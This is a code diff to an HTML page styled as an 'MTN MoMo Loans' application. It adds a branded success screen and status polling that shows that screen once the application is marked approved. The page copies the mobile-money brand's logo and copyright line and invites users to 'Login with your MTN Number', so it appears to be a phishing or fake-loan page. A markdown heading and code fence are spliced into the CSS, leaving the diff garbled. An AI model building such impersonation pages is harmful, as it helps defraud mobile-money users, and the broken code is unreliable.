@@ -76,10 +76,31 @@
         .spinner-loader { border: 4px solid rgba(255, 255, 255, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: var(--mtn-yellow); animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes pulse-border { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); } 50% { transform: scale(1.03); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); } }
-    </style>
-</head>
+
+        /* SUCCESS PAGE STYLES */
+        .success-page { display: none; background: #FFFFFF; min-height: 100vh; flex-direction: column; align-items: center; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        .success-page.active { display: flex; }
+        .success-top-bar { width: 100%; background-color: #004B87; padding: 15px 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .success-top-bar .momo-logo-img { background-color: #FFCC00; font-family: 'Arial Black', sans-serif; font-weight: 900; font-size: 20px; color: #004B87; padding: 6px 12px; border-radius: 10px; display: inline-block; letter-spacing: -1px; position: relative; }
+        .success-top-bar .momo-logo-img::before { content: '▲'; font-size: 8px; color: #004B87; position: absolute; left: 6px; top: 4px; }
+        .success-momo-title { color: #FFCC00; font-size: 15px; font-weight: bold; margin-top: 5px; margin-bottom: 2px; }
+        .success-copyright { color: #FFFFFF; font-size: 11px; opacity: 0.8; }
+        .success-content { padding: 40px 24px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; width: 100%; box-sizing: border-box; }
+        .success-checkmark-circle { width: 100px; height: 100px; background-color: #22C55E; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 50px; margin-bottom: 30px; box-shadow: 0 4px 10px rgba(34, 197, 94, 0.3); }
+        .success-main-heading { color: #0A3A60; font-size: 32px; font-weight: 800; line-height: 1.15; margin: 0 0 35px 0; letter-spacing: -0.5px; }
+        .success-next-step-box { background-color: #E6F2FF; border-radius: 16px; width: 100%; padding: 20px; display: flex; align-items: center; text-align: left; box-sizing: border-box; margin-bottom: 35px; border: 1px solid rgba(0, 75, 135, 0.1); }
+        .success-phone-icon-shape { width: 55px; height: 85px; background-color: #FFCC00; border-radius: 10px; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; margin-right: 18px; border: 2px solid #000; }
+        .success-phone-icon-shape::before { content: ''; width: 12px; height: 3px; background-color: #000; border-radius: 2px; position: absolute; top: 5px; }
+        .success-phone-icon-shape::after { content: ''; width: 4px; height: 4px; background-color: #000; border-radius: 50%; position: absolute; bottom: 5px; }
+        .success-phone-inner-m { font-family: 'Arial Black', sans-serif; font-weight: 900; font-size: 18px; color: #004B87; position: relative; margin-top: -2px; }
+        .success-phone-inner-m::before { content: '▲'; font-size: 6px; color: #004B87; position: absolute; left: -6px; top: -2px; }
+        .success-step-text-container { display: flex; flex-direction: column; }
+### Part 2: Body Elements & Form Layout
+This section establishes the main user entry canvas container, multi-step application workflow interfaces, and structural layout panels for the final confirmation view.
+
+```html
 <body>
-<div class="form-container">
+<div class="form-container" id="appFormContainer">
     <div id="spinnerOverlay" class="spinner-overlay">
         <div class="hourglass-circle">⏳</div>
         <div id="statusHeader" class="status-text">Processing Your Loan Application...</div>
@@ -191,6 +212,36 @@
                 <button type="button" class="btn-next" style="background-color: #22C55E; color: white;" onclick="submitForm()">Submit Offer</button>
             </div>
         </div>
+    </div>
+</div>
+
+<!-- NEW COMPONENT: INTEGRATED SUCCESS CANVAS VIEW -->
+<div class="success-page" id="successPageContainer">
+    <div class="success-top-bar">
+        <div class="momo-logo-img">MoMo</div>
+        <div class="success-momo-title">MTN MoMo</div>
+        <div class="success-copyright">© 2026 MTN MoMo Loans. All rights reserved.</div>
+    </div>
+    <div class="success-content">
+        <div class="success-checkmark-circle">✓</div>
+        <h1 class="success-main-heading">Loan Application<br>Submitted Successfully!</h1>
+        
+        <div class="success-next-step-box">
+            <div class="success-phone-icon-shape">
+                <div class="success-phone-inner-m">M</div>
+            </div>
+            <div class="success-step-text-container">
+                <h3 class="success-step-label">Next Step:</h3>
+                <p class="success-step-desc">Login with your MTN number to check your loan status.</p>
+            </div>
+        </div>
+
+        <button class="success-action-button" onclick="window.location.reload();">Login with your MTN Number</button>
+    </div>
+    <div class="success-footer">
+        <div class="momo-logo-img" style="background-color: #FFCC00; font-family: 'Arial Black', sans-serif; font-weight: 900; font-size: 20px; color: #004B87; padding: 6px 12px; border-radius: 10px; display: inline-block; letter-spacing: -1px; position: relative;">MoMo</div>
+        <div class="success-momo-title">MTN MoMo</div>
+        <div class="success-copyright">© 2026 MTN MoMo Loans. All rights reserved.</div>
     </div>
 </div>
 <script>
@@ -329,11 +380,19 @@
             try {
                 const res = await fetch(`/api/status/${appId}`);
                 const data = await res.json();
+                
                 if (data.status !== 'Pending') {
                     clearInterval(pollingInterval);
                     document.getElementById('spinnerOverlay').classList.remove('active');
-                    alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
-                    window.location.reload();
+                    
+                    if (data.status.toLowerCase() === 'approved') {
+                        // Dynamically hide form fields and fade in the graphical success dashboard canvas
+                        document.getElementById('appFormContainer').style.display = 'none';
+                        document.getElementById('successPageContainer').classList.add('active');
+                    } else {
+                        alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
+                        window.location.reload();
+                    }
                 }
             } catch (e) { console.error("Tracking node sync failed", e); }
         }, 3000);
@@ -342,4 +401,4 @@
 </script>
 </body>
 </html>
-
+        
